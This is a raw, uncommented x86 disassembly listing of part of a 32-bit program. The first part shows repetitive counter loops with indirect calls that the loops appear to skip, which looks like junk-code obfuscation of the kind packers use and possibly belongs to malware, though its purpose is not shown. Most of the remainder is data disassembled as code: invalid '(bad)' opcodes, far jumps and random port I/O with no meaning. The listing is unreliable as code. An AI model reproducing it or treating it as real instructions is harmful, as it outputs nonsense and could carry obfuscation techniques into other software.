  40fc04:	xor    ecx,ecx
  40fc06:	add    ecx,DWORD PTR ds:0x42b186
  40fc0c:	dec    ecx
  40fc0d:	mov    DWORD PTR ds:0x42b186,ecx
  40fc13:	jmp    0x40fbda
  40fc18:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc1b:	and    edi,edx
  40fc1d:	mov    edx,DWORD PTR [ebp+0x10]
  40fc20:	and    DWORD PTR ds:0x42b19a,0x0
  40fc2a:	mov    edi,DWORD PTR ds:0x42b19a
  40fc30:	inc    edi
  40fc31:	mov    DWORD PTR ds:0x42b19a,edi
  40fc37:	cmp    DWORD PTR ds:0x42b19a,0x25
  40fc3e:	jge    0x40fc76
  40fc44:	jmp    0x40fc69
  40fc49:	push   0x42a0fe
  40fc4e:	push   0x5d6f
  40fc53:	push   0x13cc
  40fc58:	push   DWORD PTR [ebp-0x1c]
  40fc5b:	push   0x3c54
  40fc60:	push   DWORD PTR [ebp-0x20]
  40fc63:	call   DWORD PTR ds:0x42b2ea
  40fc69:	cmp    DWORD PTR ds:0x42b19a,0x1d
  40fc70:	jb     0x40fc2a
  40fc76:	xor    ecx,eax
  40fc78:	inc    edi
  40fc79:	add    ecx,esi
  40fc7b:	and    DWORD PTR ds:0x42b1b6,0x0
  40fc85:	jmp    0x40fc97
  40fc8a:	mov    edi,DWORD PTR ds:0x42b1b6
  40fc90:	inc    edi
  40fc91:	mov    DWORD PTR ds:0x42b1b6,edi
  40fc97:	cmp    DWORD PTR ds:0x42b1b6,0x10
  40fc9e:	jae    0x40fcea
  40fca4:	cmp    DWORD PTR ds:0x42b1b6,0x6
  40fcab:	jl     0x40fcea
  40fcb1:	jmp    0x40fcc9
  40fcb6:	push   0x42a0fe
  40fcbb:	push   DWORD PTR [ebp-0x14]
  40fcbe:	push   0x1
  40fcc0:	push   DWORD PTR [ebp-0x1c]
  40fcc3:	call   DWORD PTR ds:0x42b2ee
  40fcc9:	cmp    DWORD PTR ds:0x42b1b6,0x5
  40fcd0:	jne    0x40fce5
  40fcd6:	xor    edi,edi
  40fcd8:	xor    edi,DWORD PTR ds:0x42b1b6
  40fcde:	inc    edi
  40fcdf:	mov    DWORD PTR ds:0x42b1b6,edi
  40fce5:	jmp    0x40fc8a
  40fcea:	mov    DWORD PTR [edx],ecx
  40fcec:	xor    ecx,ecx
  40fcee:	mov    ecx,DWORD PTR [ebp-0x18]
  40fcf1:	and    DWORD PTR ds:0x42b1e2,0x0
  40fcfb:	xor    edi,edi
  40fcfd:	xor    edi,DWORD PTR ds:0x42b1e2
  40fd03:	inc    edi
  40fd04:	mov    DWORD PTR ds:0x42b1e2,edi
  40fd0a:	cmp    DWORD PTR ds:0x42b1e2,0x29
  40fd11:	ja     0x40fd32
  40fd17:	jmp    0x40fd25
  40fd1c:	push   DWORD PTR [ebp-0x14]
  40fd1f:	call   DWORD PTR ds:0x42b2f2
  40fd25:	cmp    DWORD PTR ds:0x42b1e2,0x19
  40fd2c:	jb     0x40fcfb
  40fd32:	xor    ecx,eax
  40fd34:	and    edi,0x72ff
  40fd3a:	add    ecx,esi
  40fd3c:	or     DWORD PTR ds:0x42b182,0x54fc
  40fd46:	mov    DWORD PTR [ebp-0xc],ecx
  40fd49:	adc    edi,DWORD PTR ds:0x42b1e6
  40fd4f:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  40fd56:	or     edi,DWORD PTR ds:0x42b226
  40fd5c:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40fd63:	and    DWORD PTR ds:0x42b1ba,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ecx,DWORD PTR ds:0x42b1ba
  40fd78:	inc    ecx
  40fd79:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fd7f:	cmp    DWORD PTR ds:0x42b1ba,0x12
  40fd86:	jae    0x40fdca
  40fd8c:	cmp    DWORD PTR ds:0x42b1ba,0x4
  40fd93:	jle    0x40fdca
  40fd99:	jmp    0x40fda9
  40fd9e:	push   0x42b226
  40fda3:	call   DWORD PTR ds:0x42b2f6
  40fda9:	cmp    DWORD PTR ds:0x42b1ba,0x3
  40fdb0:	jne    0x40fdc5
  40fdb6:	xor    ecx,ecx
  40fdb8:	xor    ecx,DWORD PTR ds:0x42b1ba
  40fdbe:	inc    ecx
  40fdbf:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fdc5:	jmp    0x40fd72
  40fdca:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  40fdd1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fdd4:	mov    DWORD PTR [ebp+0x8],ecx
  40fdd7:	mov    ecx,DWORD PTR [ebp+0x8]
  40fdda:	xor    DWORD PTR ds:0x42b20a,edi
  40fde0:	xor    ecx,eax
  40fde2:	or     edi,DWORD PTR ds:0x42b182
  40fde8:	add    ecx,esi
  40fdea:	mov    ecx,0x242ebf1
  40fdef:	mov    edi,0xf641bf0
  40fdf4:	je     0x419191
  40fdfa:	add    DWORD PTR ds:0x42b1c2,0x6a2f
  40fe04:	mov    edx,DWORD PTR [ebp+0x8]
  40fe07:	mov    ebx,DWORD PTR ds:0x42b1aa
  40fe0d:	and    ebx,DWORD PTR ds:0x42b1f2
  40fe13:	mov    DWORD PTR ds:0x42b1aa,ebx
  40fe19:	mov    ebx,DWORD PTR [ebp-0x8]
  40fe1c:	xor    edx,eax
  40fe1e:	xor    ebx,eax
  40fe20:	xor    DWORD PTR ds:0x42b1e6,0x42b196
  40fe2a:	sub    edx,ebx
  40fe2c:	sub    edx,esi
  40fe2e:	mov    DWORD PTR ds:0x42b1ce,0x13
  40fe38:	cmp    DWORD PTR ds:0x42b1ce,0x0
  40fe3f:	je     0x40fe81
  40fe45:	cmp    DWORD PTR ds:0x42b1ce,0x1c
  40fe4c:	jb     0x40fe81
  40fe52:	jmp    0x40fe6f
  40fe57:	push   0x42b1ca
  40fe5c:	push   0x42b196
  40fe61:	push   DWORD PTR [ebp-0x1c]
  40fe64:	push   0x42a12c
  40fe69:	call   DWORD PTR ds:0x42b2fa
  40fe6f:	mov    ebx,DWORD PTR ds:0x42b1ce
  40fe75:	dec    ebx
  40fe76:	mov    DWORD PTR ds:0x42b1ce,ebx
  40fe7c:	jmp    0x40fe38
  40fe81:	xor    edx,eax
  40fe83:	and    DWORD PTR ds:0x42b196,0x0
  40fe8d:	jmp    0x40fe9f
  40fe92:	mov    ebx,DWORD PTR ds:0x42b196
  40fe98:	inc    ebx
  40fe99:	mov    DWORD PTR ds:0x42b196,ebx
  40fe9f:	cmp    DWORD PTR ds:0x42b196,0x1b
  40fea6:	jae    0x40feef
  40feac:	cmp    DWORD PTR ds:0x42b196,0x6
  40feb3:	jb     0x40feef
  40feb9:	jmp    0x40fece
  40febe:	push   0x42b226
  40fec3:	push   0x42a000
  40fec8:	call   DWORD PTR ds:0x42b2fe
  40fece:	cmp    DWORD PTR ds:0x42b196,0x5
  40fed5:	jne    0x40feea
  40fedb:	xor    ebx,ebx
  40fedd:	add    ebx,DWORD PTR ds:0x42b196
  40fee3:	inc    ebx
  40fee4:	mov    DWORD PTR ds:0x42b196,ebx
  40feea:	jmp    0x40fe92
  40feef:	mov    DWORD PTR [ebp+0x8],edx
  40fef2:	and    DWORD PTR ds:0x42b196,0x0
  40fefc:	jmp    0x40ff10
  40ff01:	xor    ebx,ebx
  40ff03:	xor    ebx,DWORD PTR ds:0x42b196
  40ff09:	inc    ebx
  40ff0a:	mov    DWORD PTR ds:0x42b196,ebx
  40ff10:	cmp    DWORD PTR ds:0x42b196,0x15
  40ff17:	jae    0x40ff62
  40ff1d:	cmp    DWORD PTR ds:0x42b196,0x4
  40ff24:	jb     0x40ff62
  40ff2a:	jmp    0x40ff43
  40ff2f:	push   DWORD PTR [ebp-0xc]
  40ff32:	push   DWORD PTR [ebp-0x1c]
  40ff35:	push   0x42a1d7
  40ff3a:	push   DWORD PTR [ebp-0xc]
  40ff3d:	call   DWORD PTR ds:0x42b306
  40ff43:	cmp    DWORD PTR ds:0x42b196,0x3
  40ff4a:	jne    0x40ff5d
  40ff50:	mov    ebx,DWORD PTR ds:0x42b196
  40ff56:	inc    ebx
  40ff57:	mov    DWORD PTR ds:0x42b196,ebx
  40ff5d:	jmp    0x40ff01
  40ff62:	mov    edx,DWORD PTR [ebp+0x8]
  40ff65:	and    DWORD PTR ds:0x42b21a,0x0
  40ff6f:	jmp    0x40ff81
  40ff74:	mov    ebx,DWORD PTR ds:0x42b21a
  40ff7a:	inc    ebx
  40ff7b:	mov    DWORD PTR ds:0x42b21a,ebx
  40ff81:	cmp    DWORD PTR ds:0x42b21a,0x17
  40ff88:	jae    0x40ffd0
  40ff8e:	cmp    DWORD PTR ds:0x42b21a,0xe
  40ff95:	jb     0x40ffd0
  40ff9b:	jmp    0x40ffb1
  40ffa0:	push   0x42a23f
  40ffa5:	push   DWORD PTR [ebp-0x20]
  40ffa8:	push   DWORD PTR [ebp-0xc]
  40ffab:	call   DWORD PTR ds:0x42b30e
  40ffb1:	cmp    DWORD PTR ds:0x42b21a,0xd
  40ffb8:	jne    0x40ffcb
  40ffbe:	mov    ebx,DWORD PTR ds:0x42b21a
  40ffc4:	inc    ebx
  40ffc5:	mov    DWORD PTR ds:0x42b21a,ebx
  40ffcb:	jmp    0x40ff74
  40ffd0:	mov    ebx,DWORD PTR [ebp-0x58]
  40ffd3:	add    DWORD PTR ds:0x42b20e,0x42b1de
  40ffdd:	add    edx,0x5708e2
  40ffe3:	imul   edx,ebx
  40ffe6:	or     DWORD PTR ds:0x42b1b6,0x7440
  40fff0:	mov    DWORD PTR [ebp-0x58],edx
  40fff3:	sub    DWORD PTR ds:0x42b192,ecx
  40fff9:	jmp    0x412359
  40fffe:	add    al,0x23
  410000:	cld    
  410001:	shl    esp,1
  410003:	mov    al,BYTE PTR [edx]
  410005:	xchg   edx,eax
  410006:	(bad)  
  410009:	retf   0xa0a6
  41000c:	dec    esi
  41000d:	mov    ebp,0x8383af3f
  410012:	ds pop esi
  410014:	add    DWORD PTR [ebx+0x3478e103],0xffffffa1
  41001b:	xchg   BYTE PTR [ecx+0xc05ad72],al
  410021:	mov    ds:0xf48adb06,eax
  410026:	(bad)  
  410027:	daa    
  410028:	sbb    eax,0x38badb06
  41002d:	imul   ecx,DWORD PTR [esi-0xeef3c79],0xffffffa1
  410034:	out    0x75,al
  410036:	sbb    eax,0xd5cb8b7b
  41003b:	fcmovnbe st,st(6)
  41003d:	shl    ebp,1
  41003f:	pop    esi
  410040:	dec    ecx
  410041:	mov    ebx,0xade98c73
  410046:	popa   
  410047:	cli    
  410048:	sub    edx,edx
  41004a:	sar    BYTE PTR [edx],0x41
  41004d:	mov    esp,0x7ffd6608
  410052:	or     eax,0x46824be
  410057:	popa   
  410058:	xor    edx,DWORD PTR [edx+0x46]
  41005b:	cmp    cl,BYTE PTR [ecx]
  41005d:	mov    bl,0x1c
  41005f:	and    bl,BYTE PTR [ecx+ecx*8]
  410062:	or     eax,0xaa58f930
  410067:	or     DWORD PTR [ecx+ebx*1-0x26],ebp
  41006b:	pop    ebx
  41006c:	fistp  DWORD PTR [ebx+0x1749b6e3]
  410072:	loopne 0x41002c
  410074:	sub    eax,0x219894e
  410079:	sar    BYTE PTR [eax+ebx*2-0x3e4caf9a],cl
  410080:	jl     0x410075
  410082:	out    dx,al
  410083:	push   0xffffffeb
  410085:	dec    ebp
  410086:	xor    eax,0x2915049b
  41008b:	setno  BYTE PTR [ebx-0x51]
  41008f:	add    edx,esi
  410091:	adc    edi,DWORD PTR [ecx]
  410093:	in     eax,dx
  410094:	inc    ebx
  410095:	add    dl,cl
  410097:	cmp    BYTE PTR [esi],dh
  410099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41009a:	xchg   ebp,eax
  41009b:	bound  ecx,QWORD PTR [edx-0x2ec71598]
  4100a1:	jl     0x4100ba
  4100a3:	(bad)  
  4100a4:	fmul   st(4),st
  4100a6:	or     edi,ebx
  4100a8:	mov    bl,BYTE PTR [esi]
  4100aa:	imul   esi,DWORD PTR [ebx-0x63],0xa06cf895
  4100b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100b2:	cmp    ch,BYTE PTR [bp+0x2cce]
  4100b7:	scas   al,BYTE PTR es:[edi]
  4100b8:	and    eax,0x20256108
  4100bd:	sbb    al,0x20
  4100bf:	jns    0x410132
  4100c1:	jno    0x410128
  4100c3:	sbb    al,0xc5
  4100c5:	xlat   BYTE PTR ds:[ebx]
  4100c6:	in     eax,dx
  4100c7:	xor    ch,cl
  4100c9:	cmp    BYTE PTR [eax+0x69],bl
  4100cc:	mov    esi,DWORD PTR [edx+0x24]
  4100cf:	(bad)  
  4100d0:	outs   dx,BYTE PTR ds:[esi]
  4100d1:	(bad)  
  4100d2:	mov    ecx,0x1608c470
  4100d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100d8:	cmp    DWORD PTR [edx+0x6ae06b4f],eax
  4100de:	in     al,0x21
  4100e0:	es mov bh,0xe7
  4100e3:	cmp    cl,BYTE PTR [ebx+0x6cead43b]
  4100e9:	sbb    eax,0xf5d77357
  4100ee:	inc    ebp
  4100ef:	jmp    0x4100d6
  4100f1:	jge    0x410144
  4100f3:	lods   al,BYTE PTR ds:[esi]
  4100f4:	inc    ebp
  4100f5:	and    DWORD PTR [edi-0x8],eax
  4100f8:	test   al,0xd3
  4100fa:	mov    eax,0x388980d5
  4100ff:	jp     0x410133
  410101:	cmp    bh,BYTE PTR [edi-0x53]
  410104:	mov    dh,0x90
  410106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410107:	mov    edx,eax
  410109:	xchg   edx,eax
  41010a:	int    0xd8
  41010c:	outs   dx,BYTE PTR ds:[esi]
  41010d:	adc    DWORD PTR [ebp-0x4],ebp
  410110:	mov    eax,0x93bbed85
  410115:	fs push es
  410117:	jns    0x4100a1
  410119:	leave  
  41011a:	xchg   ecx,eax
  41011b:	imul   edx,DWORD PTR [ebp-0x11035c7c],0x3ce11242
  410125:	pop    edx
  410126:	and    cl,BYTE PTR [eax+ecx*8+0x7e]
  41012a:	xor    BYTE PTR [edi-0x18],ch
  41012d:	xchg   edx,eax
  41012e:	mov    al,0xa2
  410130:	mov    ch,BYTE PTR [ebp+ebx*8-0x68f28568]
  410137:	imul   esp,DWORD PTR [ebx-0x63],0xffffffd7
  41013b:	out    dx,eax
  41013c:	(bad)  
  41013d:	rcr    BYTE PTR [esi-0xa618ba3],cl
  410143:	xor    eax,DWORD PTR [ebp+0x4f90963e]
  410149:	stc    
  41014a:	fwait
  41014b:	shl    BYTE PTR [eax-0x7e],0x61
  41014f:	pop    edi
  410150:	fnstcw WORD PTR [edx]
  410152:	dec    esp
  410153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410154:	jnp    0x410131
  410156:	mov    WORD PTR [ebp-0x68],?
  410159:	stos   BYTE PTR es:[edi],al
  41015a:	retf   0x594e
  41015d:	js     0x41011a
  41015f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410160:	sahf   
  410161:	retf   0xe
  410164:	mov    dh,0xa9
  410166:	cmp    al,0x12
  410168:	mov    cl,0x70
  41016a:	push   0x65
  41016c:	das    
  41016d:	mov    eax,0x68eca107
  410172:	and    BYTE PTR [ebx-0x29f3d48],bh
  410178:	test   cl,ch
  41017a:	retf   0xc9fd
  41017d:	add    esp,edx
  41017f:	cmc    
  410180:	sbb    dl,BYTE PTR [ecx]
  410182:	push   ebp
  410183:	mov    bl,0x50
  410185:	push   es
  410186:	adc    bl,BYTE PTR [esi-0x6f0b2af]
  41018c:	and    eax,0x1cb0697b
  410191:	aas    
  410192:	add    al,0x4e
  410194:	jmp    0x5ba3:0xa5f49859
  41019b:	call   0x870e:0xf0d8680f
  4101a2:	test   BYTE PTR [eax+0x1aed4b50],dh
  4101a8:	aad    0xd7
  4101aa:	xor    al,0x82
  4101ac:	push   esp
  4101ad:	add    al,0x68
  4101af:	jmp    0xfe43df5e
  4101b4:	rcl    al,1
  4101b6:	popa   
  4101b7:	test   BYTE PTR [ecx],cl
  4101b9:	xchg   ecx,eax
  4101ba:	push   edi
  4101bb:	sbb    al,dl
  4101bd:	stos   BYTE PTR es:[edi],al
  4101be:	mov    ah,0x5c
  4101c0:	in     eax,dx
  4101c1:	mov    ah,0x4
  4101c3:	out    dx,al
  4101c4:	pop    edx
  4101c5:	xchg   ecx,eax
  4101c6:	dec    esp
  4101c7:	in     al,dx
  4101c8:	into   
  4101c9:	mov    ecx,0x890818a7
  4101ce:	pop    esp
  4101cf:	cld    
  4101d0:	scas   al,BYTE PTR es:[edi]
  4101d1:	int3   
  4101d2:	js     0x410201
  4101d4:	out    dx,al
  4101d5:	cdq    
  4101d6:	mov    bh,0x45
  4101d8:	inc    esi
  4101d9:	popf   
  4101da:	push   ebx
  4101db:	push   es
  4101dc:	inc    esp
  4101dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101de:	mov    ecx,0xcc037305
  4101e3:	xchg   edi,eax
  4101e4:	add    ch,BYTE PTR [eax]
  4101e6:	mov    eax,ds:0xd680ed94
  4101eb:	inc    ecx
  4101ec:	(bad)  
  4101ed:	rol    BYTE PTR [eax+0x6f45c030],0x50
  4101f4:	mov    ds:0xf5cbc8c2,eax
  4101f9:	lahf   
  4101fa:	fisubr DWORD PTR [esi+0x3e8f2f82]
  410200:	xor    eax,0x6ec6d5bd
  410205:	enter  0x24a,0xd0
  410209:	pop    ebx
  41020a:	inc    esp
  41020b:	retf   0x6de1
  41020e:	sbb    ch,dh
  410210:	fisub  WORD PTR [ebx-0x15]
  410213:	stc    
  410214:	mov    al,ds:0xf83bff36
  410219:	(bad)  
  41021b:	pop    edx
  41021c:	xlat   BYTE PTR ds:[ebx]
  41021d:	adc    DWORD PTR [ebp+0x2],edi
  410220:	or     bh,ch
  410222:	dec    ebx
  410223:	xchg   ebx,eax
  410224:	jecxz  0x41028f
  410226:	je     0x410259
  410228:	mov    ch,0x94
  41022a:	aad    0x20
  41022c:	aad    0x90
  41022e:	sbb    dh,BYTE PTR [edx+0x74e3bf87]
  410234:	and    bh,ah
  410236:	cmp    BYTE PTR [edx+0x353cda95],dl
  41023c:	in     eax,0xb2
  41023e:	inc    edx
  41023f:	clc    
  410240:	adc    edi,DWORD PTR [edx+0x53479b]
  410246:	jmp    0x4102af
  410248:	loopne 0x41026e
  41024a:	adc    al,0x6a
  41024c:	and    bl,dh
  41024e:	popa   
  41024f:	loopne 0x410253
  410251:	sbb    DWORD PTR [eax],0xfffffff3
  410254:	sub    ch,0x3
  410257:	mov    bl,0xd3
  410259:	mov    eax,ds:0xd0eed48a
  41025e:	lahf   
  41025f:	jecxz  0x4102d9
  410261:	mov    ds:0x5a674d12,eax
  410266:	xchg   ebx,eax
  410267:	adc    BYTE PTR [edi+0x75],ah
  41026a:	(bad)  [ebx-0x160b4ae4]
  410270:	mov    ch,0x12
  410272:	lock sbb esp,esp
  410275:	mov    dl,0x59
  410277:	adc    dl,BYTE PTR [esi-0x4d543ee2]
  41027d:	aam    0x31
  41027f:	aad    0x21
  410281:	aam    0x1c
  410283:	xor    eax,eax
  410285:	out    dx,eax
  410286:	enter  0xc67c,0x14
  41028a:	fs je  0x4102ce
  41028d:	call   0x91534a4
  410292:	jge    0x410227
  410294:	xchg   BYTE PTR [ebx],cl
  410296:	mov    edi,0xc2aa5a00
  41029b:	and    BYTE PTR [esi-0x18f02a17],bl
  4102a1:	and    al,0x79
  4102a3:	(bad)  
  4102a4:	outs   dx,DWORD PTR ds:[esi]
  4102a5:	ss push eax
  4102a7:	dec    esi
  4102a8:	mov    ah,BYTE PTR [ecx]
  4102aa:	div    DWORD PTR [ebx-0x23]
  4102ad:	loop   0x410271
  4102af:	pop    edi
  4102b0:	mov    DWORD PTR [ebx],ebp
  4102b2:	mov    ah,BYTE PTR ds:0x86be0d04
  4102b8:	or     eax,0x169f6e4e
  4102bd:	repz push DWORD PTR [ecx+ebx*2+0x61992f12]
  4102c5:	sti    
  4102c6:	outs   dx,DWORD PTR ds:[esi]
  4102c7:	dec    eax
  4102c8:	stc    
  4102c9:	cdq    
  4102ca:	mov    BYTE PTR [edi+0x220a9764],al
  4102d0:	sub    BYTE PTR [eax],bl
  4102d2:	xor    al,0xa
  4102d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102d5:	xchg   ecx,eax
  4102d6:	arpl   WORD PTR [edx-0x2d],bx
  4102d9:	adc    BYTE PTR [edi-0x5154f347],dl
  4102df:	call   0x5a9c:0xc4601ec
  4102e6:	mov    ah,0x7a
  4102e8:	gs icebp 
  4102ea:	add    ch,BYTE PTR [eiz*2+0x7a98a4ad]
  4102f1:	loope  0x410278
  4102f3:	out    dx,al
  4102f4:	fmul   DWORD PTR [eax]
  4102f6:	dec    esp
  4102f7:	mov    ds:0x1f9f47e6,eax
  4102fc:	outs   dx,DWORD PTR ds:[esi]
  4102fd:	adc    eax,0x3e5630d8
  410302:	cdq    
  410303:	loop   0x410295
  410305:	ret    
  410306:	ret    
  410307:	jne    0x410294
  410309:	adc    dh,BYTE PTR [ebx+edx*8-0x2b]
  41030d:	mov    al,ds:0x151cc6e0
  410312:	aas    
  410313:	jge    0x41029f
  410315:	repnz or esi,esp
  410318:	je     0x4102f1
  41031a:	cli    
  41031b:	lods   al,BYTE PTR ds:[esi]
  41031c:	outs   dx,BYTE PTR ds:[esi]
  41031d:	pop    edi
  41031e:	test   DWORD PTR [esi+edx*2-0x74],edi
  410322:	outs   dx,DWORD PTR ds:[esi]
  410323:	(bad)  [eax*8+0x1e2af21d]
  41032a:	push   edx
  41032b:	jle    0x4102f0
  41032d:	daa    
  41032e:	mov    dh,0xca
  410330:	mov    BYTE PTR [ebp+0x0],bl
  410333:	pop    ss
  410334:	popa   
  410335:	fwait
  410336:	test   edi,0x1e99bb5e
  41033c:	cmp    BYTE PTR [ecx+0xf047ce3],dh
  410342:	push   ebp
  410343:	cli    
  410344:	inc    edx
  410345:	dec    esi
  410346:	add    al,0x3
  410348:	push   edi
  410349:	add    BYTE PTR [esi-0x14313e80],ch
  41034f:	outs   dx,BYTE PTR ds:[esi]
  410350:	mov    BYTE PTR [eax+0x50a84651],ch
  410356:	push   ebp
  410357:	dec    edx
  410358:	js     0x4103b0
  41035a:	gs mov esi,0x99eab822
  410360:	jmp    0x8923b6eb
  410365:	jmp    0x25ab:0x16dbb221
  41036c:	imul   edx,DWORD PTR [esi+ebx*1-0x42],0xffffff96
  410371:	scas   eax,DWORD PTR es:[edi]
  410372:	add    al,0xcb
  410374:	inc    edi
  410375:	push   cs
  410376:	add    ecx,edx
  410378:	dec    edx
  410379:	cmp    DWORD PTR [edx-0x6251cd3e],ebp
  41037f:	mov    cl,0x21
  410381:	adc    edx,DWORD PTR [eax-0x48d45ef]
  410387:	lods   al,BYTE PTR ds:[esi]
  410388:	and    DWORD PTR [ebx+0x4],edi
  41038b:	mov    ebp,0x1759cc8b
  410390:	(bad)  
  410391:	js     0x410352
  410393:	bound  ebp,QWORD PTR [edi-0x6b]
  410396:	sub    DWORD PTR [edi],ebx
  410398:	sub    BYTE PTR [ebx],0x77
  41039b:	xchg   ebx,eax
  41039c:	shl    DWORD PTR [edi-0x1844a341],1
  4103a2:	fwait
  4103a3:	sbb    cl,BYTE PTR [ecx]
  4103a5:	clc    
  4103a6:	lock bound esp,QWORD PTR [ecx-0x348b896c]
  4103ad:	jp     0x4103e0
  4103af:	int3   
  4103b0:	pop    ds
  4103b1:	mov    ebp,0x35c7a893
  4103b6:	inc    eax
  4103b7:	mov    cl,0x9c
  4103b9:	in     eax,0x2a
  4103bb:	adc    al,0x1c
  4103bd:	or     DWORD PTR [edx+0x12b59274],esp
  4103c3:	add    BYTE PTR [ecx+ebp*4+0x6e],ch
  4103c7:	or     BYTE PTR [esi-0x6e79cbb],bl
  4103cd:	pop    ss
  4103ce:	sbb    DWORD PTR [edx+0x28],edi
  4103d1:	shl    BYTE PTR es:[edx+0x67],0x94
  4103d6:	cs mov al,0x71
  4103d9:	popa   
  4103da:	and    DWORD PTR [edi],0xaa454128
  4103e0:	cmp    dl,ch
  4103e2:	adc    DWORD PTR [edi+0x5e],ecx
  4103e5:	xchg   ecx,eax
  4103e6:	sbb    bh,ah
  4103e8:	jmp    0x85bf:0x8f971e4c
  4103ef:	rcr    BYTE PTR ds:0x7a16f88b,0xaf
  4103f6:	sbb    BYTE PTR [ebp-0x1db8a8e4],bl
  4103fc:	(bad)  
  4103fd:	pop    edi
  4103fe:	lods   eax,DWORD PTR ds:[esi]
  4103ff:	adc    al,0xce
  410401:	loope  0x4103ad
  410403:	jge    0x410404
  410405:	(bad)  
  410406:	xchg   esi,eax
  410407:	sbb    BYTE PTR [ecx],cl
  410409:	mov    ds:0x683784b0,al
  41040e:	test   DWORD PTR [ebx-0x294ddf2f],ecx
  410414:	sbb    al,BYTE PTR [esi+edi*4-0x1771217c]
  41041b:	sahf   
  41041c:	and    dl,0xd6
  41041f:	adc    ebp,DWORD PTR [eax]
  410421:	cmp    eax,0xf0baf9cf
  410426:	cld    
  410427:	xor    al,0xb3
  410429:	fld    QWORD PTR [esi-0x54]
  41042c:	mov    ebp,0xc92e946e
  410431:	retf   
  410432:	inc    ebp
  410433:	ins    BYTE PTR es:[edi],dx
  410434:	adc    dh,ch
  410436:	popa   
  410437:	xchg   dl,ah
  410439:	mov    al,0xf2
  41043b:	push   es
  41043c:	into   
  41043d:	pop    ss
  41043e:	or     eax,0x22e148fc
  410443:	dec    esp
  410444:	jge    0x410452
  410446:	add    eax,0xa9977ef4
  41044b:	int    0x4
  41044d:	jo     0x410419
  41044f:	add    BYTE PTR [edx+0x7a965e48],dl
  410455:	sahf   
  410456:	or     al,0xe6
  410458:	sbb    edx,DWORD PTR [esi]
  41045a:	sbb    eax,0xf48c57d4
  41045f:	sbb    al,al
  410461:	gs std 
  410463:	in     eax,dx
  410464:	sbb    ecx,DWORD PTR [edi+ecx*4+0x19]
  410468:	sub    al,0x20
  41046a:	les    ecx,FWORD PTR es:[edx+0x3a898db4]
  410471:	sub    al,0xbc
  410473:	mov    eax,0x9daea02c
  410478:	inc    esp
  410479:	imul   edi,edx,0xae1e9da8
  41047f:	xor    eax,0xaf9681cd
  410484:	mov    ah,0x11
  410486:	cs xchg esi,eax
  410488:	pop    ebp
  410489:	aad    0xb6
  41048b:	adc    al,0x74
  41048d:	mov    ah,0xfc
  41048f:	fild   DWORD PTR [edi-0x7e]
  410492:	mov    eax,0xf9269137
  410497:	inc    ebx
  410498:	pop    ss
  410499:	push   ecx
  41049a:	pop    ds
  41049b:	sbb    BYTE PTR [ecx+0x2ec10da1],0x84
  4104a2:	mov    eax,0xc73ebd19
  4104a7:	adc    BYTE PTR [edx+0x46],0xe7
  4104ab:	fbstp  TBYTE PTR [edi-0x2]
  4104ae:	pop    esi
  4104af:	daa    
  4104b0:	aas    
  4104b1:	pop    edi
  4104b2:	shl    DWORD PTR [ecx-0x19],cl
  4104b5:	push   esi
  4104b6:	scas   al,BYTE PTR es:[edi]
  4104b7:	mov    dl,0xa1
  4104b9:	shl    BYTE PTR [ebx],1
  4104bb:	dec    edx
  4104bc:	xor    al,0x60
  4104be:	mov    ah,BYTE PTR [ecx+0x2e]
  4104c1:	aad    0xac
  4104c3:	mov    edi,0xbac8be08
  4104c8:	mov    eax,ds:0x1f6da82f
  4104cd:	loop   0x4104de
  4104cf:	mov    ch,0x6a
  4104d1:	ror    DWORD PTR [edx-0x78],cl
  4104d4:	outs   dx,BYTE PTR ds:[esi]
  4104d5:	fstp   QWORD PTR [edx+0x209b0bb2]
  4104db:	add    ecx,ebp
  4104dd:	dec    ecx
  4104de:	push   0x7aa0b54e
  4104e3:	je     0x410556
  4104e5:	mov    BYTE PTR [edx+0x7095df7],dh
  4104eb:	inc    esi
  4104ec:	(bad)  
  4104ed:	fsave  [bp+di+0x6bbd]
  4104f3:	out    dx,al
  4104f4:	cdq    
  4104f5:	mov    dh,0xe8
  4104f7:	inc    ebp
  4104f8:	mov    dl,0x9e
  4104fa:	mov    ch,0xeb
  4104fc:	inc    ebp
  4104fd:	add    al,0x83
  4104ff:	jne    0x4104e4
  410501:	or     DWORD PTR [ebx+0x0],esi
  410504:	sahf   
  410505:	mov    eax,0x53c2034a
  41050a:	iret   
  41050b:	cs ds or al,0xea
  41050f:	mov    ebp,0x6231af2a
  410514:	dec    ecx
  410515:	sbb    al,0xd2
  410517:	jmp    0x41054b
  410519:	xchg   DWORD PTR [edx+esi*4+0x7e],ecx
  41051d:	dec    edx
  41051e:	xchg   edx,eax
  41051f:	mov    eax,ds:0x483821a8
  410524:	leave  
  410525:	cmc    
  410526:	call   0x93a46036
  41052b:	lock sbb al,0xf1
  41052e:	retf   
  41052f:	sub    ah,bh
  410531:	mov    ebp,0x11631d8
  410536:	popf   
  410537:	cmp    dh,cl
  410539:	sub    al,0x1e
  41053b:	mov    dl,0x2
  41053d:	mov    ds:0xfd9b13f2,eax
  410542:	je     0x4104e3
  410544:	pushf  
  410545:	arpl   WORD PTR [ecx-0x151f3f81],cx
  41054b:	fst    QWORD PTR [ecx-0x7f]
  41054e:	loope  0x410508
  410550:	add    ah,ah
  410552:	mov    cl,0xf2
  410554:	pushf  
  410555:	in     al,dx
  410556:	sub    ebp,DWORD PTR [edx+0x48]
  410559:	cmp    bh,dl
  41055b:	mov    edi,fs
  41055d:	out    dx,eax
  41055e:	dec    eax
  41055f:	xor    al,0x36
  410561:	fdivr  QWORD PTR [esi-0x1df6daf7]
  410567:	adc    ebp,DWORD PTR [ebx+esi*8]
  41056a:	or     ah,ch
  41056c:	cli    
  41056d:	push   es
